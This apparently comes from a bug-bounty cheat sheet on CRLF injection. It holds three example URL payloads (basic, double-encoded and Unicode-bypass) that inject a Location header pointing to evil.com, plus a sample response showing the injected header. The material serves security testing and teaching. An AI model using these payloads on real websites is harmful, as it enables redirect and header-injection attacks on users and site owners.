# CRLF Injection

## Introduction
A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.

## Where to find
It can be found anywhere, always check the request and response. Try to search for parameters that lead to redirects, you can see the response is (301, 302, 303, 307, 308).

## How to exploit
1. Basic payload
```
https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
```
The response is
```
HTTP/1.1 200 OK
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Set-Cookie: language=en
Location: https://evil.com/
```

2. Double encode
```
https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
```

3. Bypass unicode
```
https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/
```

## References
* [@filedescriptor](https://blog.innerht.ml/twitter-crlf-injection/)
* [EdOverflow](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md)